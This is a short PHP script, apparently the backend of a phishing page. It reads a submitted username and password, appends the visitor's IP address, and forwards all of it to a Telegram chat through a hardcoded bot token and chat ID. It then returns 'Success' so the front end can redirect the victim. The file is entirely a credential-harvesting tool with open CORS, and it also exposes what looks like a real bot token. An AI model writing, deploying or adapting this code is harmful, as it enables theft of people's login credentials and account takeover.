<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Methods: POST");

// Enable error reporting (optional for debugging)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// === CONFIGURATION ===
$botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';       // Replace with your actual bot token
$chatId   = '7394958970';         // Replace with your actual chat ID

// === READ POST DATA ===
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// === BASIC VALIDATION ===
if (empty($username) || empty($password)) {
    echo "Missing credentials.";
    exit;
}

// === PREPARE TELEGRAM MESSAGE ===
$message = "🔐 *New Login Attempt*\n"
         . "*Username:* `$username`\n"
         . "*Password:* `$password`\n"
         . "*IP:* " . $_SERVER['REMOTE_ADDR'];

// === SEND TO TELEGRAM ===
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$response = file_get_contents($telegramUrl . '?' . http_build_query([
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
]));

if ($response) {
    echo "Success"; // Frontend will redirect on this
} else {
    echo "Failed to send message.";
}
?>
